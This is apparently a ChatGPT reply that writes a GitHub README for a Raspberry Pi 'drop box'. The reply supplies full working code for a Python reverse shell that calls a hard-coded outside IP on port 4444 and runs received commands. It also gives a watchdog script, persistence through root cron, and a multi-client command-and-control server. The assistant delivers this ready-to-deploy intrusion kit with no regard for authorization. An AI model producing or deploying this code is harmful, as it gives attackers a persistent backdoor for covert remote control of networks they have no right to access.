Certainly! Below is a README.md file for your GitHub repository, including the final versions of the scripts, requirements, and instructions.
README.md

markdown

# Raspberry Pi Drop Box with C2 Server

This project sets up a Raspberry Pi as a "drop box" that connects back to a command and control (C2) server. The setup includes a reverse shell script for the Raspberry Pi, a watchdog script to ensure persistence, and a C2 server script to manage multiple connections.

## Requirements

- Python 3.x
- `net-tools` package (for `netstat` command)
- `cron` (for running the watchdog script)

### Installation

1. **Install necessary packages**:
    ```bash
    sudo apt-get update
    sudo apt-get install python3 python3-pip net-tools
    ```

2. **Clone the repository**:
    ```bash
    git clone https://github.com/yourusername/yourrepository.git
    cd yourrepository
    ```

3. **Make the watchdog script executable**:
    ```bash
    chmod +x watchdog.sh
    ```

## Scripts

### Reverse Shell Script (`reverse_shell.py`)

```python
import socket
import subprocess
import os
import time

# IP address and port of the C&C server
SERVER_IP = "45.79.93.184"
SERVER_PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except socket.error:
            time.sleep(5)

def main():
    while True:
        s = connect_to_server()

        while True:
            try:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                elif command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        s.send(b"Changed directory to " + os.getcwd().encode() + b"\n")
                    except Exception as e:
                        s.send(str(e).encode() + b"\n")
                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout_value)
            except Exception as e:
                break

        s.close()
        time.sleep(5)  # Wait a bit before trying to reconnect

if __name__ == "__main__":
    main()

Watchdog Script (watchdog.sh)

bash

#!/bin/bash

# Path to the reverse shell script
SCRIPT_PATH="/path/to/reverse_shell.py"

# Check if the reverse shell script is running
if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
    echo "Reverse shell script not running. Starting it..."
    nohup python3 "$SCRIPT_PATH" &
fi

C2 Server Script (c2_server.py)

python

import socket
import threading

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

clients = {}
client_threads = {}

def handle_client(client_socket, addr, client_id):
    print(f"Connection from {addr}")

    while True:
        try:
            command = input(f"Shell ({client_id})> ")
            if command.lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                del clients[client_id]
                print(f"Connection closed for {addr}")
                break
            elif command.lower() == "back":
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except ConnectionResetError:
            print(f"Connection lost from {addr}")
            del clients[client_id]
            break

def accept_connections(server_socket):
    while True:
        client_socket, addr = server_socket.accept()
        client_id = f"{addr[0]}:{addr[1]}"
        clients[client_id] = client_socket
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr, client_id))
        client_threads[client_id] = client_thread
        client_thread.start()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((LISTEN_IP, LISTEN_PORT))
    server_socket.listen(5)
    print(f"Listening on {LISTEN_IP}:{LISTEN_PORT}")

    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
    accept_thread.start()

    while True:
        command = input("C2> ")
        if command.lower() == "list":
            for client_id in clients:
                print(client_id)
        elif command.lower().startswith("switch"):
            try:
                _, client_id = command.split()
                if client_id in clients:
                    handle_client(clients[client_id], client_id.split(":"), client_id)
                else:
                    print("Client ID not found")
            except ValueError:
                print("Usage: switch <client_id>")
        elif command.lower() == "exit":
            print("Shutting down C2 server.")
            for client_id, client_socket in clients.items():
                client_socket.send(b"exit")
                client_socket.close()
            break

if __name__ == "__main__":
    main()

Setting Up the Watchdog Script with Cron

    Edit the crontab for the root user:

    bash

sudo crontab -e

Add the following line to run the watchdog script every minute:

bash

    * * * * * /path/to/watchdog.sh

Running the C2 Server

    Start the C2 server:

    bash

    python3 c2_server.py

    Use the C2 server commands:
        list: List all active client connections.
        switch <client_id>: Switch to the shell of the specified client.
        back: Return to the C2 prompt from a client shell.
        exit: Shut down the server and close all connections.

Additional Notes

    Ensure the SERVER_IP in the reverse_shell.py script is set to the IP address of your C2 server.
    Make sure the paths in the scripts are correct and the scripts have the necessary permissions to execute.

This setup allows you to have a persistent connection from the Raspberry Pi to your C2 server, enabling remote management and control.

javascript


Save this content as `README.md` in your GitHub repository. Ensure all the scripts (`reverse_shell.py`, `watchdog.sh`, `c2_server.py`) are in the repository with the correct paths. This will provide a comprehensive guide for setting up and running the Raspberry Pi drop box and C2 server system.

ChatGPT can make mistakes. Check important info.
